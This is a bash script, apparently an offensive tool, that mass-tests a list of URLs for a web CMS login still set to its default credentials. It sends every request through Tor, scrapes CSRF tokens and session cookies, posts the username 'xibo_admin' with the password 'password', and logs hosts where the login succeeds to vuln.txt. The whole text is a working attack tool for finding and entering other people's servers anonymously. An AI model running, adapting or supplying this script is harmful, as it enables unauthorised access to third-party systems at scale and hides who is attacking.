#http.favicon.hash:2061303838
cat urls | while read line
do
echo $line
echo ""
resp=$(torify timeout 5 curl -skD -  $line/login > ./hey)


csrf=$(cat ./hey | grep "csrfToken" | grep -o -P '(?<=value=").*(?=" />)') 
cook=$(cat ./hey  | grep "PHPSESSID" | grep -o -P '(?<=PHPSESSID=).*(?=; path)') 

check=$(torify timeout 5 curl -skD - -X POST $line/login -d "priorRoute=&csrfToken=$csrf&username=xibo_admin&password=password" -H "Cookie: PHPSESSID=$cook" -H "Content-Type: application/x-www-form-urlencoded" | grep "Location: /")

if [ ! -z "$check" ];
then
echo "Vuln !"
echo $line >> vuln.txt
fi
echo ""
echo ""
done
